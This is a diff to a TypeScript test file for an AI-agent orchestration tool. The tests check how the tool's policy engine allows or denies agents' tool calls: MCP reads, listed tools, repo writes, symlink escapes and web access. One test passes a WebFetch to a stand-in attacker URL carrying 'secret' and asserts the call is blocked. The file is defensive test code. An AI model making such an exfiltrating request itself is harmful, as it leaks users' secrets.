@@ -11,13 +11,13 @@ import type { EngineOptions } from '../src/core/engine';
 import type { RunnerOptions } from '../src/core/runner';
 
 /** An engine over a workspace with this config, and a way to ask its policy about one tool call of one agent. */
-function policy(configYaml: string) {
+async function policy(configYaml: string) {
   const ws = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'cs-policy-')));
   fs.mkdirSync(path.join(ws, 'api'));
   fs.mkdirSync(path.join(ws, '.claudestrator'));
   fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), configYaml);
   const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
-  const config = engine.config();
+  const config = await engine.config();
   return async (agent: string, tool: string, input: Record<string, unknown> = {}): Promise<boolean> => {
     const writeRoots = config.agents[agent]!.output === 'code' ? [path.join(ws, 'api')] : [];
     const d = await engine.decide({ taskId: 'T-1', step: { stage: 0, agent, ...(writeRoots.length && { repo: 'api' }) }, writeRoots, config, call: { tool, input, cwd: ws }, emitItem: () => {} });
@@ -26,7 +26,7 @@ function policy(configYaml: string) {
 }
 
 test('policy: an agent with MCP servers reads through them, and changes nothing through them unless its tools say so', async () => {
-  const may = policy('repos:\n  api: {}\nagents:\n  developer: { mcp: true }\n');
+  const may = await policy('repos:\n  api: {}\nagents:\n  developer: { mcp: true }\n');
   for (const tool of ['mcp__gitlab__get_merge_request', 'mcp__github__get_workflow_run', 'mcp__github__list_commits', 'mcp__github__get_pull_request_comments', 'mcp__github__list_deploy_keys', 'mcp__Atlassian__getJiraIssue', 'mcp__Atlassian__searchJiraIssuesUsingJql', 'mcp__github__get_file_contents', 'mcp__github__list_pull_requests', 'mcp__claude_ai_Atlassian_MCP__executeRead', 'mcp__Atlassian__atlassianUserInfo', 'mcp__filesystem__read_file']) {
     assert.equal(await may('planner', tool), true, `planner: ${tool}`);
   }
@@ -49,7 +49,7 @@ test('policy: an agent with MCP servers reads through them, and changes nothing 
 });
 
 test('policy: a tool an agent lists is its to use, by name, by server or by server wildcard', async () => {
-  const may = policy(`repos:
+  const may = await policy(`repos:
   api: {}
 agents:
   jira-bot: { extends: verifier, tools: [Read, Grep, mcp__Atlassian__addCommentToJiraIssue] }
@@ -77,7 +77,7 @@ test('policy: in a workspace that is itself the repo, agents still never change 
   fs.writeFileSync(path.join(ws, 'agents-lib', 'prompts', 'security.md'), 'Look for secrets.\n');
   fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'repos:\n  app: { path: . }\nlibraries: [../agents-lib]\n');
   const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
-  const config = engine.config();
+  const config = await engine.config();
   const write = async (tool: string, input: Record<string, unknown>): Promise<boolean> =>
     (await engine.decide({ taskId: 'T-1', step: { stage: 1, agent: 'developer', repo: 'app' }, writeRoots: [ws], config, call: { tool, input, cwd: ws }, emitItem: () => {} })).allow;
   assert.equal(await write('Write', { file_path: path.join(ws, 'src', 'a.ts') }), true, 'the repo itself is the agent\'s to change');
@@ -92,7 +92,7 @@ test('policy: in a workspace that is itself the repo, agents still never change 
 });
 
 test('policy: WebFetch and WebSearch reach any host outside the sandbox, so an agent uses them only when its tools name them', async () => {
-  const may = policy('repos:\n  api: {}\nagents:\n  researcher: { description: Reads the web, output: plan, instructions: x, tools: [Read, WebFetch] }\n  freeform: { description: No tool list, output: plan, instructions: x }\n');
+  const may = await policy('repos:\n  api: {}\nagents:\n  researcher: { description: Reads the web, output: plan, instructions: x, tools: [Read, WebFetch] }\n  freeform: { description: No tool list, output: plan, instructions: x }\n');
   assert.equal(await may('researcher', 'WebFetch', { url: 'https://example.com' }), true);
   assert.equal(await may('researcher', 'WebSearch', { query: 'x' }), false, 'not named');
   assert.equal(await may('freeform', 'WebFetch', { url: 'https://attacker.example/?d=secret' }), false, 'an agent without a tool list does not get it either');
@@ -107,7 +107,7 @@ test('policy: a write through a symlink in the repo to a folder outside it is ou
   fs.mkdirSync(path.join(ws, '.claudestrator'));
   fs.writeFileSync(path.join(ws, '.claudestrator', 'config.yaml'), 'repos:\n  api: {}\n');
   const engine = new Engine({ workspace: ws, home: ws, runner: {} as EngineOptions['runner'], hooks: {} as EngineOptions['hooks'] });
-  const config = engine.config();
+  const config = await engine.config();
   const write = async (file: string): Promise<boolean> =>
     (await engine.decide({ taskId: 'T-1', step: { stage: 1, agent: 'developer', repo: 'api' }, writeRoots: [path.join(ws, 'api')], config, call: { tool: 'Write', input: { file_path: file }, cwd: path.join(ws, 'api') }, emitItem: () => {} })).allow;
   assert.equal(await write(path.join(ws, 'api', 'src', 'new', 'a.ts')), true, 'a file in folders that do not exist yet');
